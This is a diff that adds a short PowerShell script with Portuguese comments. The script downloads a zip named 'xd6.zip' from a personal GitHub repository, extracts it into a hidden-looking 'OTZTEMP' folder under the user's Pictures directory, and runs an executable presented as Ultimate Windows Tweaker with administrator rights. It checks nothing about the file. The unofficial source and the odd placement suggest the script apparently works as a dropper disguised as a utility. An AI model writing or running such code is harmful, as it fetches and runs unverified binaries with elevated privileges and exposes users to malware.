@@ -1,0 +1,21 @@
+# URL do novo arquivo a ser baixado
+$url = "https://github.com/devmenzin/Ultimate-Windows-Tweaker/raw/main/xd6.zip"
+
+# Determinar o diretório de imagens do usuário
+$diretorioImagens = [System.IO.Path]::Combine([System.Environment]::GetFolderPath("MyPictures"), "xd6")
+
+# Criar a pasta OTZTEMP dentro do diretório de imagens
+$pastaOTZTEMP = [System.IO.Path]::Combine($diretorioImagens, "OTZTEMP")
+New-Item -ItemType Directory -Path $pastaOTZTEMP -Force
+
+# Baixar o arquivo ZIP
+$arquivoZIP = [System.IO.Path]::Combine($pastaOTZTEMP, "xd6.zip")
+Invoke-WebRequest -Uri $url -OutFile $arquivoZIP
+
+# Extrair o conteúdo do ZIP
+Add-Type -AssemblyName System.IO.Compression.FileSystem
+[System.IO.Compression.ZipFile]::ExtractToDirectory($arquivoZIP, $pastaOTZTEMP)
+
+# Executar o arquivo baixado como administrador
+$arquivoExecutavel = [System.IO.Path]::Combine($pastaOTZTEMP, "Ultimate Windows Tweaker 4.8.exe")
+Start-Process -FilePath $arquivoExecutavel -Verb RunAs
